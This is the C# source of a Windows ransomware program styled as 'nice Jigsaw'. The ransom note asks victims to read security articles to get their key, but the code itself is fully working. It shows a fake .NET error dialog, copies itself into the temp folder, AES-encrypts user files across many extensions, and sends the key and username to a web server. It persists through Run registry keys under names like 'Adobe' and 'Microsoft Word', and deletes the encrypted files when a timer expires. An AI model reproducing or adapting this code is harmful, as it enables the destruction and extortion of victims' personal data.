using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace Runsome
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
            if (Check())
            {
                Hello();
            }
            else
            {
                DisplayMessage();
                RansomeProcess();
                Hello();
            }
        }

        private void DisplayMessage()
        {
            DialogResult update = MessageBox.Show("This application requires one of the following versions of the\n.NET Framework: " + Environment.Version + "\n\nDo you want to install this .NET framework version now?", "Microsoft .NET Framework", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
            if (update == DialogResult.Yes)
            {
                Process.Start("https://www.microsoft.com/en-us/download/search.aspx?q=.net%20framework");
            }
        }

        private void tmrMessage_Tick(object sender, EventArgs e)
        {
            string message = "Hello, I'm nice Jigsaw or more commonly known as Jigsaws twin.\n\nUnfortunately all of your personal files (pictures, documents, etc...) have been encrypted by me,\nan evil computer virus know as 'Ransomeware'.\n\nNow now, not to worry I'm going to let you restore them but only if you agree to stop downloading\nunsafe applications off the internet.\n\nIf you continue to do so may end up with a virus way worse than me! You might even end up meeting\nmy infamous brother Jigsaw :(\n\nWhile you're at it, you can also read the small article below by Google's security team on how to\nstay safe online.\n\nOh yeah I almost forgot! In order for me to decrypt your files you must read the two articles below,\nonce you have click the \"Get My Decryption Key\" button.\n\nThen enter in your decryption key and click the \"Decrypt My Files\" button.\nEventually all of your files will be decrypted :)\n\nIf the timer reaches zero then all of your personal files will be deleted\nbecause you were too lazy to read two articles.\n\nSo " + Environment.UserName + " do you want to play a game?";

            if (Globals.counter < message.Length)
            {
                lblMessage.Text += message[Globals.counter];
                Globals.counter++;
            }

            if (Globals.counter == message.Length)
            {
                DisplayDecryptGUI();
                lblTimeR.Visible = true;
                tmrMessage.Enabled = false;
            }
        }

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            if (txtDecryptKey.Text.Contains("ENC"))
            {
                DialogResult result = MessageBox.Show("Are you sure '" + txtDecryptKey.Text + "' is the correct decryption key?\nIf the key doesn't match the one given to you then all of your files will become corrupted.",
                    "Decryption", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Warning);
                if (result == DialogResult.Yes)
                {
                    string pass = txtDecryptKey.Text;
                    txtDecryptKey.Enabled = false;
                    txtDecryptKey.Text = "Decrypting your files...";
                    this.Hide();
                    Decryption(getDirectory(), pass);
                    DelReg();

                    MessageBox.Show("The decryption process has finished.\nSorry for any inconvenience caused. :)", "Thank you!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    Application.Exit();
                }
                else
                {
                    txtDecryptKey.Text = "";
                }
            }
            else
            {
                MessageBox.Show("You've entered the wrong decryption key, try again.", "Incorrect Decryption Key", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void txtDecryptKey_MouseClick(object sender, MouseEventArgs e)
        {
            if (txtDecryptKey.Text.Contains("decryption key..."))
            {
                txtDecryptKey.Text = "";
            }
        }

        /* 1) Generate an encryption key.
         * 2) Create a duplicate of the program so it can be added to the start up.
         * 3) Encrypt the users files.
         * 4) Send the users decryption key to a web server.
         * 5) Add the program to the startup. */

        private void RansomeProcess()
        {
            string password = GenPass();
            Duplicate();
            Encryption(getDirectory(), password, Globals.list);
            Upload(password);
            password = null;
            StartUp();
        }

        private void Hello()
        {
            this.Opacity = 100;
            this.Focus();
            GetTime();
            tmrMessage.Enabled = true;
            tmrClock.Enabled = true;
        }

        private string getDirectory()
        {
            return "C:\\Users\\" + Environment.UserName + "\\";
        }

        private string GenPass()
        {
            Random rnd = new Random();
            int length = rnd.Next(15, 20);
            string password = "ENC";
            string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!?";

            while (0 < length--)
            {
                password += valid[rnd.Next(0, valid.Length)];
            }
            return password;
        }

        private byte[] AES_ENC(byte[] inputByte, byte[] passByte)
        {
            //Credit: www.codeproject.com/Articles/769741/Csharp-AES-bits-Encryption-Library-with-Salt

            byte[] encByte = null;
            byte[] salt = new byte[] { 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29 };

            using (MemoryStream MS = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    AES.Padding = PaddingMode.Zeros;
                    const int lterations = 1000;
                    const int division = 8;

                    var key = new Rfc2898DeriveBytes(passByte, salt, lterations);

                    AES.Key = key.GetBytes(AES.KeySize / division);
                    AES.IV = key.GetBytes(AES.BlockSize / division);

                    AES.Mode = CipherMode.CBC;

                    using (var CS = new CryptoStream(MS, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        CS.Write(inputByte, 0, inputByte.Length);
                        CS.Close();
                    }

                    encByte = MS.ToArray();
                }
            }
            return encByte;
        }

        private byte[] AES_DEC(byte[] inputByte, byte[] passByte)
        {
            byte[] decByte = null;
            byte[] salt = new byte[] { 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29 };

            using (MemoryStream MS = new MemoryStream(inputByte))
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    AES.Padding = PaddingMode.Zeros;
                    const int lterations = 1000;
                    const int division = 8;

                    var key = new Rfc2898DeriveBytes(passByte, salt, lterations);

                    AES.Key = key.GetBytes(AES.KeySize / division);
                    AES.IV = key.GetBytes(AES.BlockSize / division);

                    AES.Mode = CipherMode.CBC;

                    using (var CS = new CryptoStream(MS, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        CS.Write(inputByte, 0, inputByte.Length);
                        CS.Close();
                    }

                    decByte = MS.ToArray();
                }
            }
            return decByte;
        }

        // Encryption
        private void Encryption(string startDir, string pass, List<string> list)
        {

            string[] extensions = { ".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp", ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf", ".c", ".cpp", ".cs", ".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt", ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx", ".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb", ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm", ".wav", ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa", ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx", ".flv", ".mpg", ".wmv", ".vob", ".m3u8", ".dat", ".csv", ".efx", ".sdf", ".vcf", ".xml", ".ses", ".Qbw", ".QBB", ".QBM", ".QBI", ".QBR", ".Cnt", ".Des", ".v30", ".Qbo", ".Ini", ".Lgb", ".Qwc", ".Qbp", ".Aif", ".Qba", ".Tlg", ".Qbx", ".Qby", ".1pa", ".Qpd", ".Txt", ".Set", ".Iif", ".Nd", ".Rtp", ".Tlg", ".Wav", ".Qsm", ".Qss", ".Qst", ".Fx0", ".Fx1", ".Mx0", ".FPx", ".Fxr", ".Fim", ".ptb", ".Ai", ".Pfb", ".Cgn", ".Vsd", ".Cdr", ".Cmx", ".Cpt", ".Csl", ".Cur", ".Des", ".Dsf", ".Ds4", "", ".Drw", ".Dwg.Eps", ".Ps", ".Prn", ".Gif", ".Pcd", ".Pct", ".Pcx", ".Plt", ".Rif", ".Svg", ".Swf", ".Tga", ".Tiff", ".Psp", ".Ttf", ".Wpd", ".Wpg", ".Wi", ".Raw", ".Wmf", ".Txt", ".Cal", ".Cpx", ".Shw", ".Clk", ".Cdx", ".Cdt", ".Fpx", ".Fmv", ".Img", ".Gem", ".Xcf", ".Pic", ".Mac", ".Met", ".PP4", ".Pp5", ".Ppf", ".Xls", ".Xlsx", ".Xlsm", ".Ppt", ".Nap", ".Pat", ".Ps", ".Prn", ".Sct", ".Vsd", ".wk3", ".wk4", ".XPM", ".zip", ".rar" };
            try
            {

                string[] files = Directory.GetFiles(startDir);
                string[] directorys = Directory.GetDirectories(startDir);

                for (int x = 0; x < files.Length; x++)
                {
                    string extension = Path.GetExtension(files[x]);
                    if (extensions.Contains(extension))
                    {
                        list.Add(files[x]);
                        EncryptFile(files[x], pass);
                    }
                }

                for (int x = 0; x < directorys.Length; x++)
                {
                    Encryption(directorys[x], pass, list);
                }
            }
            catch { }
        }

        private void EncryptFile(string inputfile, string pass)
        {
            byte[] fBytes = File.ReadAllBytes(inputfile);
            byte[] pBytes = Encoding.UTF8.GetBytes(pass);

            pBytes = SHA256.Create().ComputeHash(pBytes);

            byte[] encrypted = AES_ENC(fBytes, pBytes);

            File.WriteAllBytes(inputfile, encrypted);
            File.Move(inputfile, inputfile + ".encrypted");
        }

        // Decryption
        private void Decryption(string startDir, string pass)
        {
            try
            {
                string[] files = Directory.GetFiles(startDir);
                string[] directorys = Directory.GetDirectories(startDir);

                for (int x = 0; x < files.Length; x++)
                {
                    string locked = ".encrypted";
                    if (files[x].Contains(locked))
                    {
                        DecryptFile(files[x], pass);
                    }
                }

                for (int x = 0; x < directorys.Length; x++)
                {
                    Decryption(directorys[x], pass);
                }
            }
            catch { }
        }

        private void DecryptFile(string inputfile, string pass)
        {
            byte[] fBytes = File.ReadAllBytes(inputfile);
            byte[] pBytes = Encoding.UTF8.GetBytes(pass);

            pBytes = SHA256.Create().ComputeHash(pBytes);

            byte[] decrypted = AES_DEC(fBytes, pBytes);

            File.WriteAllBytes(inputfile, decrypted);
            File.Move(inputfile, inputfile.Replace(".encrypted", ""));
        }

        private bool Check()
        {
            string[] name = { "Validator", "Adobe", "Validation", "DefinatelyNotMalware", "Default", "WindowsLogon", "Microsoft", "Microsoft Word" };
            for (int x = 0; x < name.Length; x++)
            {
                if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", name[x], null) != null)
                {
                    return true;
                }
            }
            return false;
        }

        private void StartUp()
        {
            try
            {
                string[] name = { "Validator", "Adobe", "Validation", "DefinatelyNotMalware", "Default", "WindowsLogon", "Microsoft", "Microsoft Word" };
                String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
                string loc = Path.GetTempPath() + fileName;
                Random rnd = new Random();
                int n = rnd.Next(0, 9);
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue(name[n], "\"" + loc + "\"");
                }
            }
            catch { };
        }

        private void DelReg()
        {
            try
            {
                string[] name = { "Validator", "Adobe", "Validation", "DefinatelyNotMalware", "Default", "WindowsLogon", "Microsoft", "Microsoft Word" };
                for (int x = 0; x < name.Length; x++)
                {
                    if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", name[x], true) != null)
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                        {
                            key.DeleteValue(name[x], false);
                        }
                    }
                }
            }
            catch { };
        }

        private void Upload(string key)
        {
            string data = Globals.websiteURL + "register.php?name=" + Environment.UserName + "&key=" + key;
            WebClient wb = new WebClient();
            wb.DownloadString(data);
        }

        private void Duplicate()
        {
            try
            {
                String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
                String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
                File.Copy(filePath, Path.GetTempPath() + fileName);
            }
            catch { };
        }

        private void btnEncFiles_Click(object sender, EventArgs e)
        {
            frmList encFiles = new frmList(Globals.list);
            encFiles.Show();
        }

        private void DisplayDecryptGUI()
        {
            gbDecryption.Visible = true;
            linkSSO.Visible = true;
            linkJR.Visible = true;
        }

        private void lblMessage_MouseEnter(object sender, EventArgs e)
        {
            lblMessage.BackColor = Color.Black;
        }

        private void lblMessage_MouseLeave(object sender, EventArgs e)
        {
            lblMessage.BackColor = Color.Transparent;
        }

        private void btnGetKey_Click(object sender, EventArgs e)
        {
            if (Globals.linkCounter >= 2)
            {
                this.CenterToScreen();
                string password = GetData("getkey.php");
                MessageBox.Show("Your decryption key is: " + password + "\nSorry for the inconvenice. :)", "Nice Jigsaw", MessageBoxButtons.OK, MessageBoxIcon.Information);
                txtDecryptKey.Text = password;
                btnDecrypt.Enabled = true;
            }else
            {
                MessageBox.Show("You havent read the articles yet!\nIt will only take a few minutes.", "Nice Jigsaw", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private string GetData(string url)
        {
            const string regENC = "[ENC]{3}.*(?=<)";
            const string regTime = @"[0-9]{4}-[0-9][0-9]-[0-9][0-9][\s][0-9][0-9]:[0-9][0-9]:[0-9][0-9]";

            WebClient wb = new WebClient();
            string data = wb.DownloadString(Globals.websiteURL + url);

            Match match;
            if (url.Contains("key"))
            {
                match = Regex.Match(data, regENC);
            }else
            {
                match = Regex.Match(data, regTime);
            }
            return match.Value.ToString();
        }

        private void linkJR_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            //Get screen resolution
            Rectangle res = Screen.PrimaryScreen.Bounds;
            this.Location = new Point(res.Width - Size.Width, res.Height - Size.Height);

            Process.Start(Globals.jsLink);
            Globals.linkCounter++;
        }

        private void linkSSO_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            //Get screen resolution
            Rectangle res = Screen.PrimaryScreen.Bounds;
            this.Location = new Point(res.Width - Size.Width, res.Height - Size.Height);

            Process.Start(Globals.googleLink);
            Globals.linkCounter++;
        }

        private void tmrClock_Tick(object sender, EventArgs e)
        {
            TimeSpan timeLeft = Globals.remaining - DateTime.Now;
            lblTimeR.Text = timeLeft.Hours + ":" + timeLeft.Minutes + ":" + timeLeft.Seconds;

            if(timeLeft.TotalMilliseconds <= 0)
            {
                DeleteFiles();
                tmrClock.Enabled = false;
            }
        }

        private void GetTime()
        {
            try
            {
                Globals.remaining = Convert.ToDateTime(GetData("gettime.php"));
            }
            catch { };
        }

        private void DeleteFiles()
        {
            foreach(string file in Globals.list)
            {
                try
                {
                    File.Delete(file);
                }
                catch { };
            }

            MessageBox.Show("All of your personal files have been deleted, geez you really are lazy!", "Bye, bye!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            DelReg();
            Application.Exit();
        }
    }

    public static class Globals
    {
        public static int counter = 0;
        public static string websiteURL = "http://localhost/ransome/";
        public static List<string> list = new List<string>();
        public static string googleLink = "https://security.googleblog.com/2010/09/stay-safe-while-browsing.html";
        public static string jsLink = "http://www.bleepingcomputer.com/news/security/jigsaw-ransomware-decrypted-will-delete-your-files-until-you-pay-the-ransom/";
        public static int linkCounter = 0;
        public static DateTime remaining;
    }
}
